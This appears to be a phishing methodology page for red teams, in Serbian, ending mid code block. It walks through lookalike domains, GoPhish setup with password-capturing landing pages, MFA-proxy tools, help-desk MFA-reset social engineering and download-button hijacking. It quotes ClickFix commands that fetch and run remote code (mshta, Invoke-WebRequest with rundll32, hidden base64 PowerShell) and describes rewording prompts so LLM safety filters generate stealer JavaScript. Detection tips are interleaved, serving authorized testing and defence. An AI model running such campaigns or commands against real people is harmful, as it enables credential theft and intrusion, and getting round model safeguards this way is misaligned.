# Metodologija phishinga

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Izviđanje žrtve
1. Izaberite **domen žrtve**.
2. Obavite osnovnu enumeraciju weba, **tražeći login portale** koje žrtva koristi, i **odlučite** koji ćete **oponašati**.
3. Iskoristite **OSINT** da **pronađete email adrese**.
2. Pripremite okruženje
1. **Kupite domen** koji ćete koristiti za phishing procenu
2. **Konfigurišite povezane zapise email servisa** (SPF, DMARC, DKIM, rDNS)
3. Konfigurišite VPS sa **gophish**
3. Pripremite kampanju
1. Pripremite **email šablon**
2. Pripremite **web stranicu** za krađu akreditiva
4. Pokrenite kampanju!

## Generisanje sličnih naziva domena ili kupovina pouzdanog domena

### Tehnike varijacije naziva domena

- **Ključna reč**: Naziv domena **sadrži** važnu **ključnu reč** originalnog domena (npr., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomen sa crticom**: Zamenite **tačku crticom** u subdomenu (npr., www-zelster.com).
- **Novi TLD**: Isti domen uz korišćenje **novog TLD-a** (npr., zelster.org)
- **Homoglif**: **Zamenjuje** slovo u nazivu domena **slovima koja izgledaju slično** (npr., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transpozicija:** **Zamenjuje mesta dvama slovima** unutar naziva domena (npr., zelsetr.com).
- **Singularizacija/Pluralizacija**: Dodaje ili uklanja „s“ na kraju naziva domena (npr., zeltsers.com).
- **Izostavljanje**: **Uklanja jedno** od slova iz naziva domena (npr., zelser.com).
- **Ponavljanje:** **Ponavlja jedno** od slova u nazivu domena (npr., zeltsser.com).
- **Zamena**: Kao homoglif, ali manje prikriveno. Zamenjuje jedno od slova u nazivu domena, možda slovom koje se na tastaturi nalazi blizu originalnog slova (npr., zektser.com).
- **Dodavanje subdomena**: Uvodi **tačku** unutar naziva domena (npr., ze.lster.com).
- **Umetanje**: **Umeće slovo** u naziv domena (npr., zerltser.com).
- **Nedostajuća tačka**: Dodaje TLD nazivu domena. (npr., zelstercom.com)

**Automatski alati**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Web sajtovi**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi koji se čuvaju ili prenose automatski promene** usled različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji primi DNS server** nije isti kao domen koji je prvobitno zatražen.

Na primer, izmena jednog bita u domenu „windows.com“ može ga promeniti u „windnws.com“.

Napadači mogu **iskoristiti ovu mogućnost registracijom više domena nastalih promenom bitova** koji su slični domenu žrtve. Njihova namera je da legitimne korisnike preusmere na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kupovina pouzdanog domena

Na [https://www.expireddomains.net/](https://www.expireddomains.net) možete potražiti domen kojem je istekao rok i koji biste mogli da koristite.\
Da biste se uverili da domen kojem je istekao rok, a koji nameravate da kupite, **već ima dobar SEO**, možete proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Pronalaženje email adresa

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% besplatno)
- [https://phonebook.cz/](https://phonebook.cz) (100% besplatno)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **pronašli više** važećih email adresa ili **proverili one** koje ste već pronašli, možete proveriti da li možete da izvršite brute-force nad SMTP serverima žrtve. [Ovde saznajte kako da proverite/pronađete email adresu](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pored toga, ne zaboravite da, ako korisnici koriste **bilo koji web portal za pristup emailovima**, možete proveriti da li je ranjiv na **username brute force** i iskoristiti ranjivost ako je moguće.

## Konfigurisanje GoPhish

### Instalacija

Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite ga i dekompresujte unutar `/opt/gophish`, a zatim izvršite `/opt/gophish/gophish`\
U izlazu ćete dobiti lozinku za admin korisnika na portu 3333. Zato pristupite tom portu i upotrebite te akreditive da promenite admin lozinku. Možda ćete morati da tunelujete taj port na lokalni:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora biti **usmeren** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracija mail-a**

Započnite instalaciju: `apt-get install postfix`

Zatim dodajte domen u sledeće fajlove:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Takođe promenite vrednosti sledećih promenljivih unutar /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite fajlove **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže ime vašeg domena i **restartujte VPS.**

Sada kreirajte **DNS A zapis** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a i **DNS MX** zapis koji pokazuje na `mail.<domain>`

Sada testirajmo slanje email-a:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfiguracija**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` na sledeći način (obratite pažnju na upotrebu https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigurisanje gophish servisa**

Da biste kreirali gophish servis kako bi mogao automatski da se pokreće i da se njime upravlja kao servisom, možete kreirati datoteku `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfigurisanje servisa i proveru tako što ćete:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manja je verovatnoća da će biti prepoznat kao spam. Zato bi trebalo da sačekate što je duže moguće (najmanje 1 nedelju) pre phishing assessment-a. Štaviše, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija će biti bolja.

Imajte na umu da, čak i ako morate da sačekate nedelju dana, sada možete završiti sve što se tiče konfigurisanja.

### Konfigurisanje Reverse DNS (rDNS) zapisa

Postavite rDNS (PTR) zapis koji razrešava IP adresu VPS-a na naziv domena.

### Sender Policy Framework (SPF) zapis

Morate **konfigurisati SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) za generisanje SPF policy-ja (koristite IP adresu VPS mašine)

![SPF Wizard formular za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)

Ovo je sadržaj koji mora biti postavljen unutar TXT zapisa u domenu:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Morate **konfigurisati DMARC record za novi domen**. Ako ne znate šta je DMARC record, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate kreirati novi DNS TXT record koji pokazuje na hostname `_dmarc.<domain>`, sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Morate **konfigurisati DKIM za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj vodič je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Potrebno je da spojite obe B64 vrednosti koje DKIM ključ generiše:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testirajte ocenu konfiguracije e-pošte

To možete uraditi pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
Samo otvorite stranicu i pošaljite e-poštu na adresu koju vam daju:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Takođe možete **proveriti konfiguraciju e-pošte** slanjem e-pošte na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i pogledate odgovor u datoteci _/var/mail/root_ ako e-poštu šaljete kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Možete takođe poslati **poruku na Gmail nalog pod vašom kontrolom** i proveriti **zaglavlja e-pošte** u Gmail prijemnom sandučetu; `dkim=pass` bi trebalo da bude prisutan u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Uklanjanje sa Spamhouse crne liste

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam pokaže da li spamhouse blokira vaš domain. Zahtev za uklanjanje vašeg domain/IP možete podneti na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft crne liste

Zahtev za uklanjanje vašeg domain/IP možete podneti na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish kampanje

### Sending Profile

- Postavite neki **name to identify** sending profile
- Odlučite sa kog account-a ćete slati phishing emails. Predlozi: _noreply, support, servicedesk, salesforce..._
- Username i password možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors

![Kreiranje i pokretanje GoPhish kampanje - Sending Profile: Username i password možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se korišćenje funkcionalnosti "**Send Test Email**" kako biste proverili da li sve funkcioniše.\
> Preporučujem da **test emails** šaljete na 10min mail addresses kako biste izbegli dospevanje na blacklist tokom testiranja.

### Email Template

- Postavite neki **name to identify** template
- Zatim napišite **subject** (ništa neobično, samo nešto što biste očekivali da pročitate u regularnom emailu)
- Proverite da li je označeno "**Add Tracking Image**"
- Napišite **email template** (možete koristiti variables kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Imajte na umu da se, **kako bi se povećala verodostojnost emaila**, preporučuje korišćenje nekog potpisa iz emaila klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
- Pretražite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
- Pokušajte da kontaktirate **neku otkrivenu važeću** email adresu i sačekajte odgovor

![Sending Profile - Email Template: Pokušajte da kontaktirate neku otkrivenu važeću email adresu i sačekajte odgovor](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava da **priložite fajlove za slanje**. Ako takođe želite da ukradete NTLM challenges koristeći posebno pripremljene fajlove/dokumente, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Unesite **ime**
- **Unesite HTML kod** web stranice. Imajte na umu da možete **importovati** web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Podesite **redirection**

![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i obavite nekoliko testova lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML kod u polje.\
> Imajte na umu da, ako treba da **koristite neke statičke resurse** za HTML (možda neke CSS i JS stranice), možete da ih sačuvate u _**/opt/gophish/static/endpoint**_ i zatim im pristupite preko _**/static/\<filename>**_

> [!TIP]
> Za redirection možete **preusmeriti korisnike na legitimnu glavnu web stranicu** žrtve ili ih, na primer, preusmeriti na _/static/migration.html_, postaviti neki **indikator učitavanja (**[**https://loading.io/**](https://loading.io)**) na 5 sekundi i zatim prikazati da je proces uspešno završen**.

### Users & Groups

- Podesite ime
- **Importujte podatke** (imajte na umu da su za korišćenje template-a iz primera potrebni ime, prezime i email adresa svakog korisnika)

![Landing Page - Users & Groups: Importujte podatke (imajte na umu da su za korišćenje template-a iz primera potrebni ime, prezime i email adresa svakog korisnika)](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte campaign tako što ćete izabrati ime, email template, landing page, URL, sending profile i grupu. Imajte na umu da će URL biti link koji se šalje žrtvama.

Imajte na umu da **Sending Profile omogućava slanje testnog emaila kako biste videli kako će konačni phishing email izgledati**:

![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje testnog emaila kako biste videli kako će konačni phishing email izgledati](<../../images/image (192).png>)

Kada je sve spremno, samo pokrenite campaign!

## Website Cloning

Ako iz bilo kog razloga želite da klonirate web stranicu, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing procenama (uglavnom za Red Teams) želećete da takođe **pošaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili samo nešto što će pokrenuti autentifikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično domišljat jer imitirate stvarnu web stranicu i prikupljate informacije koje je korisnik uneo. Nažalost, ako korisnik nije uneo ispravnu lozinku ili ako je aplikacija koju ste imitirali konfigurisana sa 2FA, **ove informacije vam neće omogućiti da se predstavite kao prevareni korisnik**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat će vam omogućiti da izvedete napad nalik MitM napadu. U osnovi, napadi funkcionišu na sledeći način:

1. **Imitirate login** formu stvarne web stranice.
2. Korisnik **šalje** svoje **credentials** na vašu lažnu stranicu, a alat ih šalje stvarnoj web stranici, **proveravajući da li credentials funkcionišu**.
3. Ako je nalog konfigurisan sa **2FA**, MitM stranica će ga zatražiti, a kada ga **korisnik unese**, alat će ga poslati stvarnoj web stranici.
4. Kada se korisnik autentifikuje, vi ćete (kao napadač) imati **prikupljene credentials, 2FA, cookie i sve informacije** iz svake interakcije tokom izvođenja MitM napada.

### Via VNC

Šta ako, umesto da **pošaljete žrtvu na zlonamernu stranicu** koja izgleda kao originalna, pošaljete žrtvu u **VNC sesiju sa browserom povezanim na stvarnu web stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, korišćeni MFA, cookie-je...\
To možete uraditi pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Očigledno, jedan od najboljih načina da saznate da li ste otkriveni jeste da **pretražite svoj domen unutar blacklist-a**. Ako se nalazi na listi, to na neki način znači da je vaš domen prepoznat kao sumnjiv.\
Jedan jednostavan način da proverite da li se vaš domen nalazi na nekoj blacklisti jeste korišćenje adrese [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjivu phishing aktivnost u internetu**; to je objašnjeno na stranici:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen sa veoma sličnim imenom** kao što je domen žrtve **i/ili generisati certificate** za **subdomain** domena pod vašom kontrolom, koji **sadrži** **keyword** domena žrtve. Ako **žrtva** izvrši bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma neprimetni.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da procenite da li će vaš email završiti u spam folderu, biti blokiran ili uspešno isporučen.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Savremene intrusion sets sve češće u potpunosti preskaču email mamce i **direktno ciljaju service-desk / identity-recovery workflow** kako bi zaobišli MFA. Napad u potpunosti koristi "living-off-the-land" pristup: čim operator preuzme validne credentials, prelazi na druge sisteme pomoću ugrađenih admin alata – malware nije potreban.<sup>[[6]](#references)</sup>

### Attack flow
1. Izvršite reconnaissance žrtve
* Prikupite lične i korporativne podatke sa LinkedIn-a, iz data breaches, javnog GitHub-a itd.
* Identifikujte identitete visoke vrednosti (executives, IT, finance) i utvrdite **tačan help-desk proces** za resetovanje password-a / MFA.
2. Social engineering u realnom vremenu
* Pozovite, kontaktirajte preko Teams-a ili pošaljite chat help-desk-u dok se predstavljate kao meta (često uz **spoofed caller-ID** ili **cloned voice**).
* Navedite prethodno prikupljene PII podatke kako biste prošli verifikaciju zasnovanu na znanju.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** registrovanog mobilnog broja.
3. Neposredne radnje nakon pristupa (≤60 min u stvarnim slučajevima)
* Uspostavite foothold kroz bilo koji web SSO portal.
* Enumerišite AD / AzureAD pomoću ugrađenih alata (bez ubacivanja binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateralno kretanje pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već whitelisted u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privileged operation** – zahtevajte step-up auth i odobrenje managera.
* Implementirajte **Identity Threat Detection & Response (ITDR)** / **UEBA** pravila koja generišu upozorenje za:
* Promenu MFA metode + autentifikaciju sa novog uređaja / geo-lokacije.
* Neposrednu elevaciju istog principal-a (user-→-admin).
* Snimajte help-desk pozive i zahtevajte **callback na već registrovani broj** pre bilo kakvog resetovanja.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** kako novo-resetovani nalozi ne bi automatski nasledili tokene sa visokim privilegijama.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews nadoknađuju troškove high-touch operacija masovnim napadima koji **pretvaraju search engines i ad networks u delivery channel**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** postavlja lažni rezultat, kao što je `chromium-update[.]site`, na vrh search oglasa.
2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri koje je uočio Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader eksfiltruje browser cookies + credential DBs, a zatim preuzima **silent loader** koji – *u realnom vremenu* – odlučuje šta će instalirati:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** i na *search-ads* i na email.
* Ograničite instalaciju software-a na potpisane MSI / Store packages i pravilima zabranite izvršavanje `HTA`, `ISO`, `VBS`.
* Pratite child procese browsera koji otvaraju installere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tražite LOLBins koje first-stage loaders često zloupotrebljavaju (npr. `regsvr32`, `curl`, `mshta`).

### Hijacking download-button-a sa TDS handoff-om
Neki lažni software portali ostavljaju vidljivi download `href` koji pokazuje na **stvarni GitHub/release URL**, ali pomoću JavaScript-a preuzimaju kontrolu nad **prvom** interakcijom korisnika i umesto toga šalju žrtvu u lanac **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ključne karakteristike:
- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, pa se aktivira pre handlera sajta.
- Chrome često koristi `mousedown` umesto `click` kako bi preusmeravanje ostalo povezano sa važećom **user gesture** radnjom i poboljšalo zaobilaženje popup blokera.
- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, a URL TDS-a dodeljuju tek kasnije.
- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može voditi do malware-a, dok se osvežavanja/ponovni pokušaji vraćaju na benigni link koji je vidljiv korisniku.
- TDS može filtrirati na osnovu referrera, ulaznog domena, GEO lokacije, fingerprinta browsera/uređaja, provera VPN/datacentar opsega, konteksta klika i brojača po sesiji, zbog čega replay analitičara nije determinističan.

Ideje za Defender:
- Upoređujte **prikazani** `href` sa **stvarnim** odredištem navigacije koje se generiše u trenutku klika.
- Tražite `document.addEventListener(..., true)` handlere koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` u blizini `window.open`, `about:blank` ili simuliranih klikova na anchor elemente.
- Grupacije novoregistrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage tretirajte kao obrazac SEO poisoning/TDS visoke pouzdanosti.

### ClickFix sa lažnih stranica za verifikaciju + LOLBAS preuzimanja koja izgledaju kao arhive
Neke TDS grane završavaju na lažnoj stranici za verifikaciju (u stilu Cloudflare/IUAM) koja žrtvi nalaže da pokrene pouzdani Windows binary, kao što je:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; dodati arhivski podaci mogu biti čista varka.
- Naredne faze često nastavljaju da lažno prikazuju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim podacima), a zatim prelaze na **manual PE mapping / in-memory execution**.
- Ako odgovarate na jedan od ovih lanaca, sačuvajte **network + memory od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezopasnu putanju instalera/SFX-a ili neuspeti jer su payload/key release vezani za originalnu TDS sesiju.

### ClickFix DLL delivery tradecraft (lažno CERT ažuriranje)
* Mamac: klonirano obaveštenje nacionalnog CERT-a sa dugmetom **Update** koje prikazuje detaljna uputstva za „popravku“. Žrtvama se nalaže da pokrenu batch koji preuzima DLL i izvršava ga pomoću `rundll32`.<sup>[[12]](#references)</sup>
* Uočeni tipični batch lanac:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` smešta payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva eksportovanu ulaznu tačku (`notepad`).
* DLL šalje identitet hosta beacon-om i proverava C2 svakih nekoliko minuta. Daljinski tasking stiže kao **base64-encoded PowerShell** koji se izvršava skriveno i uz zaobilaženje policy-ja:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo zadržava fleksibilnost C2-a (server može da menja taskove bez ažuriranja DLL-a) i skriva console prozore. Tražite PowerShell child procese procesa `rundll32.exe` koji zajedno koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Defenders mogu tražiti HTTP(S) callback zahteve u obliku `...page.php?tynor=<COMPUTER>sss<USER>` i intervale polling-a od 5 minuta nakon učitavanja DLL-a.

---

## AI-Enhanced Phishing Operations
Napadači sada povezuju **LLM & voice-clone APIs** za potpuno personalizovane mamce i interakciju u realnom vremenu.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generisanje i slanje više od 100 hiljada emailova / SMS poruka sa nasumično izmenjenim tekstom i tracking linkovima.|
|Generative AI|Kreiranje *one-off* emailova koji se pozivaju na javno dostupne M&A informacije i interne šale sa društvenih mreža; deep-fake glasa CEO-a u callback prevari.|
|Agentic AI|Autonomna registracija domena, prikupljanje open-source intel podataka i sastavljanje emailova naredne faze kada žrtva klikne, ali ne pošalje kredencijale.|

**Defence:**
• Dodajte **dynamic banners** koji ističu poruke poslate iz nepouzdane automatizacije (pomoću ARC/DKIM anomalija).
• Uvedite **voice-biometric challenge phrases** za telefonske zahteve visokog rizika.
• Kontinuirano simulirajte AI-generated mamce u programima podizanja svesti – statički template-i su zastareli.

Pogledajte i – zloupotrebu agentic browsing-a za credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i – zloupotrebu AI agent-a za lokalne CLI alate i MCP (za inventarizaciju secrets podataka i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu isporučiti HTML koji izgleda bezopasno i **generisati steal­er tokom izvršavanja** tako što od **trusted LLM API-ja** zatraže JavaScript, a zatim ga izvrše u browseru (npr. `eval` ili dinamički `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** kodirajte exfil URL-ove/Base64 stringove u promptu; iterirajte formulaciju da biste zaobišli safety filtere i smanjili hallucinations.
2. **Client-side API call:** pri učitavanju JS poziva javni LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u statičkom HTML-u prisutan je samo prompt/API poziv.
3. **Assemble & exec:** spojite odgovor i izvršite ga (polimorfno pri svakoj poseti):
```javascript
